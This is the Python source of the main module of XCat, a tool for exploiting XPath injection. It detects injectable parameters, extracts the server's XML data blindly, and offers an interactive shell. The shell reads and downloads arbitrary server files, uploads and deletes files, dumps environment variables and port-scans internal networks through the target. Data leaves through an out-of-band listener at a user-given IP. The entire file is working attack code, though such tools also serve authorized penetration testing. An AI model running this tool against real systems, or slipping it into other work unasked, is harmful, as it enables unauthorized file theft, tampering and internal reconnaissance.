"""
XCat.

Usage:
    xcat <url> <target_parameter> [<parameters>]... (--true-string=<string> | --true-code=<code>) [--shell] [--fast]
         [--method=<method>] [--oob-ip=<ip> (--oob-port=<port>)] [--stats] [--concurrency=<val>]
    xcat detectip

"""
import os

import atexit
import docopt
import asyncio
import aiohttp
import operator
import ipgetter
import ipaddress
import pathlib

import sys

import time

from xcat.algorithms import iterate_all, count, get_string_via_oob, get_string, get_nodes
from xcat.requester import Requester
from xcat.payloads import detect_payload
from xcat.features import detect_features
from typing import Callable
from xcat.display import display_xml
import shlex
import base64

from xcat.xpath import E
from xcat.xpath.fs import write_text, append_binary, base_64_binary, delete, read_binary
from xcat.xpath.saxon import read_binary_resource
from xcat.xpath.xpath_1 import concat, string, string_length, substring
from xcat.xpath.xpath_2 import doc, document_uri, current_date_time, doc_available, resolve_uri
from xcat.xpath.xpath_3 import unparsed_text_lines, unparsed_text_available, unparsed_text, \
    available_environment_variables, environment_variable


def run():
    arguments = docopt.docopt(__doc__)

    if arguments['detectip']:
        print('Finding external IP address...')
        ip = ipgetter.myip()

        if ip:
            print(f'External IP: {ip}')
        else:
            print('Could not find external IP!')
        return

    match_function = make_match_function(arguments)

    url = arguments['<url>']
    target_parameter = arguments['<target_parameter>']
    parameters = arguments['<parameters>']

    oob_ip = arguments["--oob-ip"]
    oop_port = arguments["--oob-port"]

    shell = arguments['--shell']
    fast = arguments['--fast']
    stats = arguments['--stats']
    concurrency = arguments['--concurrency']

    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(start_action(url, target_parameter,
                                             parameters, match_function,
                                             oob_ip, oop_port,
                                             shell, fast, stats, concurrency))
    except KeyboardInterrupt:
        loop.stop()


async def start_action(url, target_parameter, parameters, match_function, oob_ip, oob_port,
                       shell, fast, stats, concurrency):
    async with aiohttp.ClientSession() as session:
        payload_requester = Requester(url, target_parameter, parameters, match_function,
                                      session, concurrency=concurrency)

        print("Detecting injection points...")
        payloads = await detect_payload(payload_requester)

        for payload in payloads:
            print(payload.name)
            print(f' - Example: {payload.example}')

        if not payloads:
            print("No payloads found! Perhaps the target is not injectable, or xcat just sucks")
            return
        elif len(payloads) > 1:
            print("Multiple payloads found! Please specify them via the command line. "
                  "In the future. When this is implemented.")
            return
        else:
            chosen_payload = payloads[0]

        requester = Requester(url, target_parameter, parameters, match_function, session,
                              injector=chosen_payload.payload_generator,
                              external_ip=oob_ip, external_port=oob_port,
                              fast=fast, concurrency=concurrency)

        print("Detecting Features...")
        features = await detect_features(requester)

        for feature, available in features:
            print(f' - {feature.name} - {available}')
            requester.features[feature.name] = available

        try:
            if shell:
                await run_shell(requester)
            else:
                t1 = time.time()
                await display_xml([await get_nodes(requester)])
                t2 = time.time()
                print(f'Total Time: {round(t2-t1)} seconds')
            print(f'Total Requests: {requester.total_requests}')
        finally:
            await requester.stop_oob_server()

        if stats:
            print('Stats:')
            for name, counter in requester.counters.items():
                print(f'{name}:')
                for name, value in counter.most_common(10):
                    print(f' - {name} {value}')


def make_match_function(arguments) -> Callable[[aiohttp.Response, str], bool]:
    true_code, true_code_invert = arguments['--true-code'] or '', False

    if true_code.startswith('!'):
        true_code_invert = True
        true_code = true_code[1:]

    true_string, true_string_invert = arguments['--true-string'] or '', False

    if true_code.startswith('!'):
        true_code_invert = True
        true_code = true_code[1:]

    match_operator = operator.ne if true_code_invert or true_string_invert else operator.eq

    def response_checker(response: aiohttp.Response, content: str) -> bool:
        if true_code:
            match = match_operator(response.status, true_code)
        else:
            match = match_operator(true_string in content, True)

        return match

    return response_checker


async def run_shell(requester: Requester):
    # This function is horrible and I feel bad :(
    # The rest of the code is quite nice. I could refactor this into a much nicer
    # implementation but I don't have time.
    try:
        import readline
    except ImportError:
        pass
    else:
        histfile = os.path.join(os.path.expanduser("~"), ".xcat_history")

        try:
            readline.read_history_file(histfile)
        except FileNotFoundError:
            pass

        atexit.register(readline.write_history_file, histfile)

    print("XCat shell. Enter a command or 'help' for help. Funnily enough.")
    while True:
        cmd = input('>> ')
        command = shlex.split(cmd)

        if not command:
            continue

        if command[0] == "help":
            pass

        if command[0] == "fetch":
            if len(command) != 2:
                print("fetch 'xpath expression'")
            else:
                await display_xml([await get_nodes(requester, E(command[1]))])

        if command[0] == 'pwd':
            if requester.features['document-uri']:
                print(await get_string(requester, document_uri(E('/'))))
            else:
                print('document-uri function not supported with this injection')

        if command[0] == 'time':
            if requester.features['current-datetime']:
                print(await get_string(requester, string(current_date_time())))
            else:
                print('current-dateTime not supported with this injection')

        if command[0] == 'find-file':
            if len(command) != 2:
                print('find-file "path"')
            else:
                if not requester.features['unparsed-text'] and not requester.features['doc-function']:
                    print('unparsed-text and doc function not available. Cannot continue')
                    continue

                for i in range(10):
                    path = ('../' * i) + command[1]
                    print(path)

                    path_expression = resolve_uri(path, document_uri(E('/')))

                    if requester.features['doc-function']:
                        if await requester.check(doc_available(path_expression)):
                            print(f'XML file {path} available')

                    if requester.features['unparsed-text']:
                        if await requester.check(unparsed_text_available(path_expression)):
                            print(f'Text file {path} available')

        if command[0] == 'write-text':
            if len(command) != 3:
                print('write-text "location" "text"')
            else:
                if not requester.features['expath-file']:
                    print('expath not supported, cannot continue')
                    continue

                location, text = command[1], command[2]
                print(f'Writing {text} to {location}')
                if await requester.check(write_text(location, text)):
                    print('Appeared to succeed!')
                else:
                    print('Appeared not to succeed. Might have though')

        if command[0] == 'download':
            if len(command) != 3:
                print('download "remote path" "local path"')
            else:
                if (not requester.features['expath-file'] and not requester.features['saxon']) \
                        or not requester.features['oob-http']:
                    print('(expath and saxon) or doc function not supported, cannot continue')
                    continue

                remote, local = command[1], pathlib.Path(command[2])
                if local.exists():
                    print(f'{local} already exists! Not overwriting')
                    continue

                func = read_binary if requester.features['expath-file'] else read_binary_resource
                expression = string(func(remote))

                print(f'Downloading {remote} to {local}')

                size = await count(requester, expression, func=string_length)
                print(f'Size: {size}')

                CHUNK_SIZE = 1024
                result = ""
                for index in range(1, size+1, CHUNK_SIZE):
                    data = await get_string_via_oob(requester, substring(expression, index, CHUNK_SIZE))
                    if data is None:
                        sys.stdout.write('! (data may be corrupted) ')
                    else:
                        result += data
                        sys.stdout.write(".")
                    sys.stdout.flush()
                sys.stdout.write('\n')
                local.write_bytes(base64.decodebytes(result.encode()))
                print(f'Downloaded, saved to {local}')

        if command[0] == 'upload':
            if len(command) != 3:
                print('upload "local path" "remote path"')
            else:
                if not requester.features['expath-file']:
                    print('expath not supported, cannot continue')
                    continue

                local, remote = pathlib.Path(command[1]), command[2]
                if not local.exists():
                    print(f'Cannot find {local}!')
                    continue

                print(f'Uploading {local} to {remote}')
                data = local.read_bytes()
                print(f'Length: {len(data)} bytes')
                chunks = list(split_chunks(data, 256))
                print(f'Uploading {len(chunks)} chunks')

                await requester.check(delete(remote))

                for i, chunk in enumerate(chunks, 1):
                    chunk = base64.b64encode(chunk).decode()
                    for _ in range(5):
                        if await count(requester, append_binary(remote, base_64_binary(chunk)) == 0):
                            sys.stdout.write('.')
                            break
                        else:
                            sys.stdout.write('!')
                    else:
                        print(f'Failed to upload chunk {i} 5 times. Giving up. Sorry.')
                    sys.stdout.flush()

                sys.stdout.write('\n')

        if command[0] == 'rm':
            if len(command) != 2:
                print('rm "path"')
            else:
                if not requester.features['expath-file']:
                    print('expath fs extensions not found, cannot continue')
                    continue

                if not await count(requester, delete(command[1])) == 0:
                    print('Failed to delete file')
                else:
                    print('Deleted')

        if command[0] == 'env':
            if requester.features['environment-variables']:
                all_exp = available_environment_variables()
                total = await count(requester, all_exp)
                env_output = [
                    concat(env_name, ' = ', environment_variable(env_name))
                    for env_name in all_exp[:total + 1]
                ]
                async for variable in iterate_all(requester, env_output):
                    print(variable)
            else:
                print('environment-variables not supported with this injection')

        if command[0] == "scan":
            if len(command) != 3:
                print('scan "ip address or network" port')
                print('If using an ip network ensure you wrap it in quotes')
            else:
                addr, port = command[1], command[2]
                try:
                    if '/' in addr:
                        addresses = list(ipaddress.ip_network(addr))
                    else:
                        addresses = [ipaddress.ip_address(addr)]
                except ValueError as e:
                    print(f'Error: {e}')
                else:
                    print(f'Scanning {len(addresses)} addresses')
                    print('Some libraries implement a ridiculous timeout and this could DOS the server')
                    if input('Are you sure you want to continue? [y/n] ').lower() != 'y':
                        continue
                    print('Top Tip: Use --concurrency to scan faster')

                    async def _check(addr):
                        http_addr = f'http://{addr}:{port}/'
                        if await requester.check(unparsed_text_available(http_addr)):
                            print(f'{addr}:{port} - available')

                    await asyncio.gather(*[_check(addr) for addr in addresses])

        if command[0] == "cat_xml":
            if len(command) != 2:
                print("cat_xml 'path'")
            else:
                await display_xml([await get_nodes(requester, doc(command[1]).add_path('/*'))])

        if command[0] in {"cat", "ls"}:
            if len(command) != 2:
                print(f"{command[0]} 'path'")
                print('Path can include external network resources (http, ftp, etc)')
            else:
                if requester.features['unparsed-text']:
                    if not await requester.check(unparsed_text_available(command[1])):
                        print(f'File {command[1]} doesn\'t seem to be available.')
                        if input('Continue anyway? [y/n] ').lower() != 'y':
                            continue

                    if requester.features['oob-http']:
                        # Fetch in one go
                        expression = unparsed_text(command[1])
                        print(await get_string_via_oob(requester, expression))
                    else:
                        # Line by line
                        expression = unparsed_text_lines(command[1])
                        length = await count(requester, expression)
                        print(f"Lines: {length}")
                        async for line in iterate_all(requester, expression[:length + 1]):
                            print(line)
                elif requester.features['oob-entity-injection']:
                    pass


def split_chunks(l, n):
    """Yield successive n-sized chunks from l."""
    for i in range(0, len(l), n):
        yield l[i:i + n]


if __name__ == "__main__":
    run()
